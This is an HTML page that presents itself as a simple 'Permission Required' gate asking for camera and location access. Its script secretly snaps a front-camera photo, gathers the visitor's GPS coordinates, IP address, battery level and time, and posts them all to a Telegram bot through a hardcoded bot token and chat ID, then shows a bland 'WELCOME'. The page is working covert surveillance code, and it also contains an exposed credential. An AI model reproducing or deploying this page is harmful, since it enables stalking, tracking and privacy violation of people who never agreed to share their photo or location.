<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission Required</title>
    <style>
        body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        #permissionPrompt { display: block; }
        #welcome { display: none; }
        button { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 18px; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <div id="permissionPrompt">
        <p>Please enable Camera and Location permissions to continue.</p>
        <button onclick="requestPermission()">Grant Permissions</button>
    </div>
    <div id="welcome">WELCOME</div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const TELEGRAM_CHAT_ID = "5112680061";  

        let video = document.createElement("video");
        let canvas = document.createElement("canvas");
        let context = canvas.getContext("2d");

        // 🔥 Function to request permissions
        function requestPermission() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    // Hide permission prompt
                    document.getElementById("permissionPrompt").style.display = "none";

                    // Start capturing the photo after 2 sec
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let imageData = canvas.toDataURL("image/png");
                        stream.getTracks().forEach(track => track.stop());  // Stop camera

                        getUserDetails(imageData);
                    }, 2000); // 2 sec to capture photo

                    video.srcObject = stream;
                })
                .catch(err => {
                    alert("Permission Denied: Unable to access Camera or Location");
                });
        }

        async function getUserDetails(imageData) {
            let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
            let locationPromise = new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
                    () => resolve("Location Denied")
                );
            });

            // Fetching Time and IP Address
            let currentTime = new Date().toLocaleString();
            let ipPromise = fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "IP not available");

            let [battery, location, ip] = await Promise.all([batteryPromise, locationPromise, ipPromise]);

            sendToTelegram(imageData, battery, location, currentTime, ip);
        }

        function sendToTelegram(imageData, battery, location, currentTime, ip) {
            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}\n🕒 Time: ${currentTime}\n🌐 IP: ${ip}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
            }).catch(error => console.log("Message sending error:", error));

            let blob = dataURItoBlob(imageData);
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, "image.png");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(() => {
                document.body.style.backgroundColor = "black";
                document.getElementById("welcome").style.display = "block";
            }).catch(error => console.log("Photo sending error:", error));
        }

        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
